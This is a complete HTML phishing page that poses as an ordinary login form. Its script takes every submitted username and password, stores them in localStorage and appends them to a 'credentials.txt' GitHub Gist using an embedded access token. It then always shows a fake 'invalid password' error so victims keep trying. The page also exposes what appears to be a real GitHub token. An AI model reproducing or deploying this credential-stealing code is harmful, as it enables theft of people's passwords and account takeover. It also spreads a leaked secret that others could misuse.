<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-container button:hover {
            opacity: 0.8;
        }
        .error-message {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
        <div class="error-message" id="errorMessage">Invalid username or password</div>
    </form>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        const timestamp = new Date().toISOString();
        
        // Store in localStorage as backup
        let credentials = JSON.parse(localStorage.getItem('credentials') || '[]');
        credentials.push({ username, password, timestamp });
        localStorage.setItem('credentials', JSON.stringify(credentials));
        
        // Send to GitHub Gist
        sendToGist(username, password, timestamp);
        
        // Show error message
        document.getElementById('errorMessage').style.display = 'block';
        
        // Clear the form
        document.querySelector('input[name="username"]').value = '';
        document.querySelector('input[name="password"]').value = '';
    });
    
    function sendToGist(username, password, timestamp) {
        // Replace YOUR_GITHUB_TOKEN with your actual token
        const githubToken = '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';
        
        // Replace YOUR_GIST_ID with your actual gist ID
        const gistId = '68e118158461ea3a255171d3579a196f';
        
        // Get current content
        fetch(`https://api.github.com/gists/${gistId}`, {
            headers: {
                'Authorization': `token ${githubToken}`
            }
        })
        .then(response => response.json())
        .then(data => {
            // Get current content
            const currentContent = data.files['credentials.txt'].content;
            
            // Add new credentials
            const newEntry = `Username: ${username}, Password: ${password}, Time: ${timestamp}\n`;
            const updatedContent = currentContent + '\n' + newEntry;
            
            // Update gist
            return fetch(`https://api.github.com/gists/${gistId}`, {
                method: 'PATCH',
                headers: {
                    'Authorization': `token ${githubToken}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    files: {
                        'credentials.txt': {
                            content: updatedContent
                        }
                    }
                })
            });
        })
        .then(response => response.json())
        .then(data => {
            console.log('Credentials saved to Gist');
        })
        .catch(error => {
            console.error('Error saving to Gist:', error);
        });
    }
</script>

</body>
</html>
